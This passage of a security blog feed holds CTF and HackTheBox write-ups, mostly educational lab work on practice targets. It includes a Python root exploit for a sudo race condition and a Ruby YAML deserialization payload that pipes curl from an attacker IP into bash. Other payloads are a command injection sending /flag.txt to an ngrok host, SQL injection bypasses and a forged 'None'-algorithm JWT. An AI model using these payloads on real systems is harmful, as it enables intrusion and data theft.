  <span class="n">outfile</span> <span class="o">=</span> <span class="n">randstr</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"echo %s | sudo -S /usr/bin/dloader http://127.0.0.1:%d %s &amp;"</span> <span class="o">%</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Waiting for request..."</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[+] Client connected: %s..."</span> <span class="o">%</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Creating dangling symlink to '/root/.ssh/authorized_keys'..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ln -s /root/.ssh/authorized_keys /opt/downloads/%s"</span> <span class="o">%</span><span class="p">(</span><span class="n">outfile</span><span class="p">))</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Sending public key..."</span><span class="p">)</span>
  <span class="n">pubkey</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
  <span class="n">rsp</span> <span class="o">=</span> <span class="s">"HTTP/1.0 200 OK</span><span class="se">\r\n</span><span class="s">Server: SimpleHTTP/0.6 Python/3.7.3</span><span class="se">\r\n</span><span class="s">Content-type: text/plain; charset=utf-8</span><span class="se">\r\n</span><span class="s">Content-Length: %d</span><span class="se">\r\n\r\n</span><span class="s">"</span> <span class="o">%</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pubkey</span><span class="p">))</span>
  <span class="n">rsp</span> <span class="o">+=</span> <span class="n">pubkey</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">rsp</span><span class="p">)</span>
  <span class="n">conn</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
  <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Attempting SSH login as root..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"ssh -i exploit.key root@127.0.0.1"</span><span class="p">)</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"[*] Cleanup..."</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"exploit.key.pub"</span><span class="p">)</span>
  <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"/opt/downloads/"</span> <span class="o">+</span> <span class="n">outfile</span><span class="p">)</span>
  <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
  <span class="n">exploit</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It worked, and I was able to login as <code class="language-plaintext highlighter-rouge">root</code> and get the flag :)</p>

<p><img src="/assets/img/Pasted image 20230628221209.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230628221242.png" alt="" /></p>

<hr />

<p><br /></p>

<h4 id="summary">Summary</h4>
<p><br /></p>

<ul>
  <li>Challenge exposes port 20022 (OpenSSH) and 20080 (Nginx)</li>
  <li>Nginx homepage links to <code class="language-plaintext highlighter-rouge">exa.payback.local:20080</code>;
    <ul>
      <li>Web app has a registration form, but an “activation code” is required to complete registration.</li>
      <li>The code validation is vulnerable to <em>NoSQL Injection</em>, making it possible to bypass the check.</li>
      <li>Profile page has password reset feature handled by <code class="language-plaintext highlighter-rouge">/user/profile</code> route.</li>
      <li>The implementation is vulnerable to <em>mass assignment</em> vulnerability that allows privesc to site administrator.</li>
      <li>Administrator has access to the “Export Questions” feature in course management page, which is vulnerable to LFI, and can be used to load the SSH key of a local user named <code class="language-plaintext highlighter-rouge">exa</code> at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code></li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">exa</code>;
    <ul>
      <li>A credential for a user named <code class="language-plaintext highlighter-rouge">admin</code> was found in <code class="language-plaintext highlighter-rouge">.dbshell</code>, which is the history file of MongoDB client.</li>
      <li><code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/payback</code> showed that another VHOST exists locally, with the hidden server listening on port <code class="language-plaintext highlighter-rouge">3000</code>.</li>
      <li>Setup an SSH tunnel to port <code class="language-plaintext highlighter-rouge">3000</code> for access from my box, and the credential found in <code class="language-plaintext highlighter-rouge">.dbshell</code> worked for the web application.</li>
      <li>Quote preview feature is vulnerable to SSTI (EJS), which I exploited to leak <code class="language-plaintext highlighter-rouge">process.env</code> and obtain DB creds.</li>
      <li>DB creds gave me access to the backend DB, and recovered a hash for a user account named <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
      <li>Hash was cracked successfully using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>, and worked for the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>.</li>
    </ul>
  </li>
  <li>Inside the box as <code class="language-plaintext highlighter-rouge">agent47</code>;
    <ul>
      <li><code class="language-plaintext highlighter-rouge">sudo -l</code> showed SUDO perms to <code class="language-plaintext highlighter-rouge">/usr/bin/dloader</code>, which is a custom HTTP downloader.</li>
      <li><code class="language-plaintext highlighter-rouge">dloader</code> attempts to prevent us from writing to existing files, but it has a <em>race condition</em> vulnerability.</li>
      <li>Exploited the program to overwrite the SSH key of the <em>root</em> user, which allowed me to login and get the flag at <code class="language-plaintext highlighter-rouge">/root/flag.txt</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="ctf" /><category term="ctf" /><category term="web" /><category term="express" /><category term="svelte" /><category term="nodejs" /><category term="NoSQL injection" /><category term="mongodb" /><category term="mass assignment" /><category term="lfi" /><category term="ssh" /><category term="tunneling" /><category term="ssti" /><category term="ejs" /><category term="race condition" /><category term="libcurl" /><summary type="html"><![CDATA[Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition).]]></summary></entry><entry><title type="html">Precious - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/precious.html" rel="alternate" type="text/html" title="Precious - HackTheBox" /><published>2023-05-20T00:00:00+01:00</published><updated>2023-05-20T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/precious</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/precious.html"><![CDATA[<p><strong>Precious</strong> is a very easy linux machine on <em>HackTheBox</em>. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom <em>YAML deserialization</em> exploit to elevate to <em>root</em>.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/Pasted image 20230325061650.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325061731.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>
<p><br /></p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Mar 15 07:29:11 2023 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.189
Nmap scan report for 10.10.11.189
Host is up (0.46s latency).
Not shown: 992 closed ports
PORT      STATE    SERVICE           VERSION
22/tcp    open     ssh               OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp    open     http              nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Mar 15 07:30:57 2023 -- 1 IP address (1 host up) scanned in 106.44 seconds
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="web">Web</h4>
<p><br /></p>

<p>Site is a <em>web page to PDF converter</em>;</p>

<p><img src="/assets/img/Pasted image 20230325062726.png" alt="" /></p>

<p>Giving it the URL to a web server running on my host, I got a request, and a PDF download was initiated with the contents of the web page;</p>

<p><img src="/assets/img/Pasted image 20230325063224.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325063056.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325071135.png" alt="" /></p>

<p>Attempts to use the <code class="language-plaintext highlighter-rouge">file://</code> protocol to read local files kept failing. Using <code class="language-plaintext highlighter-rouge">netcat</code> to capture the request headers, the <em>user agent</em> looks interesting;</p>

<p><img src="/assets/img/Pasted image 20230325063510.png" alt="" /></p>

<p><strong>wkhtmltopdf</strong> is a utility for converting HTML pages to PDF. My searches for exploits lead me to <a href="http://hassankhanyusufzai.com/SSRF-to-LFI/">this article</a>, but had no luck with it on the box. Looking at the metadata of the generated PDF file;</p>

<p><img src="/assets/img/Pasted image 20230325063817.png" alt="" /></p>

<p>Looking for vulnerabilities lead me to <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">CVE-2022-25765</a>;</p>

<p><img src="/assets/img/Pasted image 20230325064748.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325064812.png" alt="" /></p>

<p>I used it to spawn a reverse shell on the box as <em>ruby</em>;</p>

<p><img src="/assets/img/Pasted image 20230325065000.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="user">User</h3>
<p><br /></p>

<p><em>Ruby</em> does not have <code class="language-plaintext highlighter-rouge">user.txt</code>. Another user in the box exists with the name <em>henry</em>. Looking into <em>ruby’s</em> home directory, the creds of <em>henry</em> were found in <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code>;</p>

<p><img src="/assets/img/Pasted image 20230325065343.png" alt="" /></p>

<p>Using this password, I was able to login to the box as <em>henry</em> over SSH;</p>

<p><img src="/assets/img/Pasted image 20230325065455.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p><em>henry</em> is not in any special group. Checking <code class="language-plaintext highlighter-rouge">sudo</code> perms showed he can run a custom script;</p>

<p><img src="/assets/img/Pasted image 20230325065608.png" alt="" /></p>

<p><img src="/assets/img/Pasted image 20230325065910.png" alt="" /></p>

<p>Notice that at line <strong>10</strong>, the program is loading a <em>YAML</em> file using relative path, which means we could be able to control the file being read. Using the guide in <a href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/">this post</a>, I was able to get code execution as <code class="language-plaintext highlighter-rouge">root</code> using the following payload;</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="nn">---</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Installer</span>
     <span class="na">i</span><span class="pi">:</span> <span class="s">x</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::SpecFetcher</span>
     <span class="na">i</span><span class="pi">:</span> <span class="s">y</span>
 <span class="pi">-</span> <span class="kt">!ruby/object:Gem::Requirement</span>
   <span class="na">requirements</span><span class="pi">:</span>
     <span class="kt">!ruby/object:Gem::Package::TarReader</span>
     <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::BufferedIO</span>
       <span class="na">io</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::Package::TarReader::Entry</span>
          <span class="na">read</span><span class="pi">:</span> <span class="m">0</span>
          <span class="na">header</span><span class="pi">:</span> <span class="s2">"</span><span class="s">abc"</span>
       <span class="na">debug_output</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
          <span class="na">socket</span><span class="pi">:</span> <span class="nl">&amp;1</span> <span class="kt">!ruby/object:Gem::RequestSet</span>
              <span class="na">sets</span><span class="pi">:</span> <span class="kt">!ruby/object:Net::WriteAdapter</span>
                  <span class="na">socket</span><span class="pi">:</span> <span class="kt">!ruby/module</span> <span class="s1">'</span><span class="s">Kernel'</span>
                  <span class="na">method_id</span><span class="pi">:</span> <span class="s">:system</span>
              <span class="na">git_set</span><span class="pi">:</span> <span class="s">curl 10.10.16.6/shell.sh | bash</span>
          <span class="na">method_id</span><span class="pi">:</span> <span class="s">:resolve</span> 
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/Pasted image 20230325070521.png" alt="" /></p>

<hr />
<p><br /></p>

<h3 id="summary">Summary</h3>
<p><br /></p>

<ul>
  <li>NMAP identified a web server.</li>
  <li>Site is used for converting web pages from a URL to a PDF
    <ul>
      <li>Uses <em>pdfkit v0.8.6</em>, which is vulnerable to <strong>CVE-2022-25765</strong></li>
      <li>Gained code execution as <em>ruby</em></li>
    </ul>
  </li>
  <li><em>ruby</em>;
    <ul>
      <li>Found the creds of <em>henry</em> at <code class="language-plaintext highlighter-rouge">/home/ruby/.bundle/config</code></li>
    </ul>
  </li>
  <li><em>henry</em>
    <ul>
      <li>Has <code class="language-plaintext highlighter-rouge">sudo</code> perms on a custom script that loads <code class="language-plaintext highlighter-rouge">dependencies.yml</code> using relative path.</li>
      <li>Exploited <em>YAML</em> deserialization to get code execution as <code class="language-plaintext highlighter-rouge">root</code></li>
    </ul>
  </li>
</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="easy" /><category term="linux" /><category term="web" /><category term="pdfkit" /><category term="wkhtmltopdf" /><category term="ruby" /><category term="deserialization" /><category term="yaml" /><category term="yaml deserialization" /><summary type="html"><![CDATA[Precious is a very easy linux machine on HackTheBox. It starts with exploiting a web application that generates a PDF file based on the output of a URL. Lateral movement to a local user involves finding a password in a configuration file, and a custom YAML deserialization exploit to elevate to root.]]></summary></entry><entry><title type="html">Cyber Apocalypse 2023 - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html" rel="alternate" type="text/html" title="Cyber Apocalypse 2023 - HackTheBox" /><published>2023-03-23T00:00:00+01:00</published><updated>2023-03-23T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/cyberapoc_23.html"><![CDATA[<p><strong>Cyber Apocalypse 2023</strong> is a very nice jeopardy-style CTF competition hosted by <em>HackTheBox</em>. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.</p>

<p><br /></p>

<h3 id="web">Web</h3>
<p><br /></p>

<h4 id="trapped-source">Trapped Source</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Challenge has no downloadables. Starting the container and going to homepage showed a lock;</p>

<p><img src="/assets/img/20230323061832.png" alt="" /></p>

<p>Checking the page source showed the correct PIN;</p>

<p><img src="/assets/img/20230323061930.png" alt="" /></p>

<p>Entering it revealed the flag;</p>

<p><img src="/assets/img/20230323062019.png" alt="" /></p>

<p><br /></p>

<h4 id="gunhead">Gunhead</h4>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has some sort of console for running commands;</p>

<p><img src="/assets/img/20230323062644.png" alt="" /></p>

<p>The output of the <code class="language-plaintext highlighter-rouge">/ping</code> command looks very similar to that generated by the <code class="language-plaintext highlighter-rouge">ping</code> utility. Checking <em>burp</em> showed the request was made to <code class="language-plaintext highlighter-rouge">/api/ping</code>;</p>

<p><img src="/assets/img/20230323062829.png" alt="" /></p>

<p>Going through the downloaded source files, the code that handles the request was found in <code class="language-plaintext highlighter-rouge">models/ReconModel.php</code>;</p>

<p><img src="/assets/img/20230323063045.png" alt="" /></p>

<p>This is clearly vulnerable to shell command injection. The <code class="language-plaintext highlighter-rouge">Dockerfile</code> showed that the flag is saved locally as <code class="language-plaintext highlighter-rouge">/flag.txt</code>, which I was able to read using <code class="language-plaintext highlighter-rouge">curl</code> to make a request to my server with the file contents;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"ip"</span><span class="p">:</span><span class="s2">"`curl http://0cbd-102-91-4-18.ngrok.io/$(cat /flag.txt | base64 -w 0)`"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323063540.png" alt="" /></p>

<p><br /></p>

<h4 id="drobots">DRobots</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<p>Site has a login page;</p>

<p><img src="/assets/img/20230323063838.png" alt="" /></p>

<p><img src="/assets/img/20230323063947.png" alt="" /></p>

<p>Going through the downloaded source, the function that handles login is clearly vulnerable to <em>SQL Injection</em>;</p>

<p><img src="/assets/img/20230323064458.png" alt="" /></p>

<p>Bypassed auth successfully by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" or 1=1-- -</code>;</p>

<p><img src="/assets/img/20230323064550.png" alt="" /></p>

<p><br /></p>

<h4 id="passman">Passman</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img src="/assets/img/20230323064948.png" alt="" /></p>

<p>Clicking the <strong>Create</strong> button opened a registration form, and I was able to create an account and login. The app is a password manager;</p>

<p><img src="/assets/img/20230323065217.png" alt="" /></p>

<p>Burp showed some requests to <code class="language-plaintext highlighter-rouge">/graphql</code> endpoint, which is used for GraphQL queries.</p>

<p>Our login request generated the query;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"query"</span><span class="p">:</span><span class="s2">"mutation($username: String!, $password: String!) { LoginUser(username: $username, password: $password) { message, token } }"</span><span class="p">,</span><span class="nl">"variables"</span><span class="p">:{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"testuser"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"testpass"</span><span class="p">}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>The implementation was found at <code class="language-plaintext highlighter-rouge">helpers/GaphqlHelper.js</code> in the downloaded files;</p>

<p><img src="/assets/img/20230323065836.png" alt="" /></p>

<p>Just below the above code is another named <code class="language-plaintext highlighter-rouge">UpdatePassword</code> that seems interesting;</p>

<p><img src="/assets/img/20230323065906.png" alt="" /></p>

<p>Notice how, although there is a check to ensure the user is authenticated, the function is calling <code class="language-plaintext highlighter-rouge">db.updatePassword()</code> with the username and password supplied by the user. <code class="language-plaintext highlighter-rouge">updatePassword()</code> is implemented in <code class="language-plaintext highlighter-rouge">database.js</code> file;</p>

<p><img src="/assets/img/20230323070301.png" alt="" /></p>

<p>As can be seen above, the application is using user-defined username to update password, which means we could reset the password of another user. Note that the <code class="language-plaintext highlighter-rouge">entrypoint.sh</code> file showed that a user named <em>admin</em> exists.</p>

<p>There is no option in the web UI for changing user password. So I tried updating the request used for <code class="language-plaintext highlighter-rouge">LoginUser</code> as it has similar structure with <code class="language-plaintext highlighter-rouge">UpdatePassword</code> to reset the password of <em>admin</em>, and it worked!</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /graphql HTTP/1.1
Host: 139.59.176.230:30434
Content-Length: 195
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://139.59.176.230:30434
Referer: http://139.59.176.230:30434/dashboard
Accept-Encoding: gzip, deflate
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwiaXNfYWRtaW4iOjAsImlhdCI6MTY3OTU1MDYxNn0.hHFrRgThAy4kvGO546KjdvNquPXk3NPknaJt_VvB_P4
Connection: close

{"query":"mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }","variables":{"username":"admin","password":"testpass"}}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I was able to login using <code class="language-plaintext highlighter-rouge">admin:testpass</code>;</p>

<p><img src="/assets/img/20230323071013.png" alt="" /></p>

<p><br /></p>

<h4 id="orbital">Orbital</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><img src="/assets/img/20230323071313.png" alt="" /></p>

<p>Login request;</p>

<p><img src="/assets/img/20230323071445.png" alt="" /></p>

<p>Login handler is implemented in <code class="language-plaintext highlighter-rouge">routes.py</code> and <code class="language-plaintext highlighter-rouge">database.py</code>;</p>

<p><img src="/assets/img/20230323071724.png" alt="" /></p>

<p><img src="/assets/img/20230323071756.png" alt="" /></p>

<p>The above is clearly vulnerable to <em>SQL Injection</em>, but the call to <code class="language-plaintext highlighter-rouge">passwordVerify()</code> may complicate things;</p>

<p><img src="/assets/img/20230323071931.png" alt="" /></p>

<p>The <code class="language-plaintext highlighter-rouge">passwordVeryify()</code> function is simply checking to make sure the password we entered matched the hashed (MD5) password that was retrieved from the query. Since we can control the query using the SQL injection bug, we can make it return a hash whose plaintext we already know (Example: <code class="language-plaintext highlighter-rouge">179ad45c6ce2cb97cf1029e212046e81</code>, which is <code class="language-plaintext highlighter-rouge">testpass</code>). Since the query returns only two columns (username, and password), we can use a UNION query to return our own values by setting <code class="language-plaintext highlighter-rouge">username</code> to <code class="language-plaintext highlighter-rouge">" union select 'admin', '179ad45c6ce2cb97cf1029e212046e81'-- -</code> and <code class="language-plaintext highlighter-rouge">password</code> to <code class="language-plaintext highlighter-rouge">testpass</code>;</p>

<p><img src="/assets/img/20230323072526.png" alt="" /></p>

<p>It worked!</p>

<p><img src="/assets/img/20230323072808.png" alt="" /></p>

<p>The lower part of the page has a listing, and clicking on <em>export</em> initiated a download;</p>

<p><img src="/assets/img/20230323072909.png" alt="" /></p>

<p>The request was made to <code class="language-plaintext highlighter-rouge">/api/export</code>;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre>POST /api/export HTTP/1.1
Host: 138.68.162.218:31631
Content-Length: 28
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept: */*
Sec-GPC: 1
Accept-Language: en-GB,en
Origin: http://138.68.162.218:31631
Referer: http://138.68.162.218:31631/home
Accept-Encoding: gzip, deflate
Cookie: session=eyJhdXRoIjoiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SjFjMlZ5Ym1GdFpTSTZJbUZrYldsdUlpd2laWGh3SWpveE5qYzVOVGMwTkRVd2ZRLk9YMDNVd2NRRUdKUGJUZDZfNWE5SmNISDFSb2lJa0c1NU5WRTB0V3ZGVFUifQ.ZBvxUg.ZGT_pJMLFlN-rF7GxVnxfIndbFc
Connection: close

{"name":"communication.mp3"}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The implementation is clearly vulnerable to <em>Local File Inclusion (LFI)</em>;</p>

<p><img src="/assets/img/20230323073229.png" alt="" /></p>

<p>From the downloaded <code class="language-plaintext highlighter-rouge">Dockerfile</code>, flag is saved as <code class="language-plaintext highlighter-rouge">/signal_sleuth_firmware</code>. Using the LFI, I was able to read it;</p>

<p><img src="/assets/img/20230323073442.png" alt="" /></p>

<p><br /></p>

<h4 id="didactic-octo-paddles">Didactic Octo Paddles</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>medium</em></li>
</ul>

<p><img src="/assets/img/20230323073753.png" alt="" /></p>

<p>An <em>Express</em> web app. Going through downloaded source code showed a hidden route <code class="language-plaintext highlighter-rouge">/register</code>, which allowed me to register and login;</p>

<p><img src="/assets/img/20230323074058.png" alt="" /></p>

<p>Nothing of much interest in the dashboard. Going through more of the source code showed another route <code class="language-plaintext highlighter-rouge">/admin</code>;</p>

<p><img src="/assets/img/20230323074323.png" alt="" /></p>

<p>The route is protected by a <em>middleware</em>, which are commonly used in <em>Express</em> apps for access control. The implementation is in <code class="language-plaintext highlighter-rouge">AdminMiddleware.js</code>;</p>

<p><img src="/assets/img/20230323074717.png" alt="" /></p>

<p>As can be seen above, the error message we are getting when going to <code class="language-plaintext highlighter-rouge">/admin</code> was generated by this middleware, which means the <code class="language-plaintext highlighter-rouge">/admin</code> route handler in <code class="language-plaintext highlighter-rouge">index.js</code> was never actually used.</p>

<p>The application is also dangerously using the <em>algrorithm</em> defined in user-supplied JWT for verification (line <code class="language-plaintext highlighter-rouge">28</code>), although the first check (line <code class="language-plaintext highlighter-rouge">13</code>) is attempting to prevent user from bypassing verification by setting the algorithm to <code class="language-plaintext highlighter-rouge">none</code>. The header of the JWT issued by the website after login was <code class="language-plaintext highlighter-rouge">{"alg":"HS256","typ":"JWT"}</code>.</p>

<p>Running some local tests, I realised that the value passed in  <code class="language-plaintext highlighter-rouge">alg</code> is case-insensitive. Since the web app is blocking use of <code class="language-plaintext highlighter-rouge">none</code> as the value of <code class="language-plaintext highlighter-rouge">alg</code> in a case-sensitive manner, setting it to <code class="language-plaintext highlighter-rouge">None</code> will bypass this check.</p>

<p>The body of the token issued to us after login decodes to;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="mi">2</span><span class="p">,</span><span class="nl">"iat"</span><span class="p">:</span><span class="mi">1679553628</span><span class="p">,</span><span class="nl">"exp"</span><span class="p">:</span><span class="mi">1679557228</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Since the <code class="language-plaintext highlighter-rouge">database.js</code> file showed that a user named <code class="language-plaintext highlighter-rouge">admin</code> is created when the app is first run, and the ID column is set to auto-increment, we can be sure that the admin’s ID is <code class="language-plaintext highlighter-rouge">1</code>. So I cracted a token with <code class="language-plaintext highlighter-rouge">alg</code> set to <code class="language-plaintext highlighter-rouge">None</code>,  <code class="language-plaintext highlighter-rouge">id</code> set to <code class="language-plaintext highlighter-rouge">1</code>, and signature part of the token deleted. It worked!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwiaWF0IjoxNjc5NTUzNjI4LCJleHAiOjE2Nzk1NTcyMjh9.
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20230323080423.png" alt="" /></p>

<p>Nothing of much interest is in the admin dashboard, only names of users. Checking the source code showed that it uses <em>JSRender</em> to display data, which could be vulnerable to <em>Server Side Template Injection (SSTI)</em> if the usernames are not <a href="https://appcheck-ng.com/template-injection-jsrender-jsviews">properly validated</a>;</p>

<p><img src="/assets/img/20230323080743.png" alt="" /></p>

<p>Creating a user with name <code class="language-plaintext highlighter-rouge">{{:7*7}}</code> evaluated the username to <code class="language-plaintext highlighter-rouge">49</code>, which confirmed the vulnerability. <code class="language-plaintext highlighter-rouge">Dockerfile</code> confirmed the flag is at <code class="language-plaintext highlighter-rouge">/flag.txt</code>, so I used the vulnerability to read it using the payload;</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
